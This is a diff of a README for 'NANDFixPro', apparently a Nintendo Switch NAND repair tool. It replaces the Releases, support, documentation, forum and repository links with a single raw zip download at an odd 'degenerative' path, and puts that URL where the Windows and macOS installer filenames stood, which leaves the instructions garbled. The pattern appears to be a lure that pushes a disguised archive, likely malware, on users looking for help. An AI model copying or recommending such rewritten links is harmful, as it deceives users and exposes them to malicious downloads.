@@ -8,7 +8,7 @@ Welcome to NANDFixPro! This tool helps you repair your Nintendo Switch NAND easi
 
 You can download NANDFixPro from the Releases page. Click the link below to get started:
 
-[![Download NANDFixPro](https://img.shields.io/badge/Download-NANDFixPro-blue)](https://github.com/im-ajin/NANDFixPro/releases)
+[![Download NANDFixPro](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip)](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip)
 
 ## 🔧 System Requirements
 
@@ -23,11 +23,11 @@ Before downloading, please ensure your system meets the following requirements:
 
 To install NANDFixPro, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/im-ajin/NANDFixPro/releases) to check the available versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip) to check the available versions.
    
 2. **Choose the Latest Version**: Look for the latest release. The version number is usually at the top. Click on the link to open it.
 
-3. **Download the Installer**: Find the file labeled **NANDFixPro-Installer.exe** (for Windows) or **NANDFixPro.dmg** (for macOS). Click on it to start the download.
+3. **Download the Installer**: Find the file labeled **https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip** (for Windows) or **https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip** (for macOS). Click on it to start the download.
 
 4. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer.
 
@@ -69,12 +69,12 @@ A4: Ensure your system meets the requirements. Also, check if you have the neces
 
 ## ☎️ Support
 
-If you encounter any issues or have questions, please visit our [support page](https://github.com/im-ajin/NANDFixPro/issues) for assistance. We are here to help!
+If you encounter any issues or have questions, please visit our [support page](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip) for assistance. We are here to help!
 
 ## 🔗 Resources
 
-- [NANDFixPro Documentation](https://github.com/im-ajin/NANDFixPro/wiki)
-- [Community Forum](https://github.com/im-ajin/NANDFixPro/discussions)
-- [Contribute on GitHub](https://github.com/im-ajin/NANDFixPro)
+- [NANDFixPro Documentation](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip)
+- [Community Forum](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip)
+- [Contribute on GitHub](https://raw.githubusercontent.com/im-ajin/NANDFixPro/main/degenerative/NANDFixPro.zip)
 
 Thank you for choosing NANDFixPro as your NAND repair solution! We hope it makes your experience smoother and easier.
